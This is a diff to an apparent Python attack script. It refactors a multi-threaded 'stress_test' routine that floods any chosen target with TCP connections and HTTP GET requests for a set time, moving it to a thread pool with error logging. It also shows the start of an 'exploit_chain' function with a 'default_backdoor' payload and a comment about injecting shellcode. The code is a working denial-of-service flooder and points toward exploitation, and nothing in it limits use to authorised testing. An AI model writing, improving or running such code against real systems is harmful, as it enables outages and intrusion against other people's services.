@@ -5,6 +5,8 @@ import socket
 import requests
 from scapy.all import *  # For packet crafting; pip install scapy
 import random
+import concurrent.futures
+import logging
 import threading
 import time
 
@@ -29,16 +31,16 @@ def stress_test(target, port=80, threads=50, duration=60):
         end_time = time.time() + duration
         while time.time() < end_time:
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((target, port))
-                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
-                s.close()
-            except:
-                pass
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.connect((target, port))
+                    s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
+            except (socket.error, OSError) as e:
+                logging.debug("Connection error: %s", e)
     print(f"[+] Applying pressure to {target}:{port} with {threads} threads for {duration}s")
-    for _ in range(threads):
-        t = threading.Thread(target=flood)
-        t.start()
+    max_workers = min(threads, 100)
+    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+        futures = [executor.submit(flood) for _ in range(threads)]
+        concurrent.futures.wait(futures)
 
 def exploit_chain(target, payload="default_backdoor"):
     # Shadow module: Simulate exploit (real: inject shellcode)
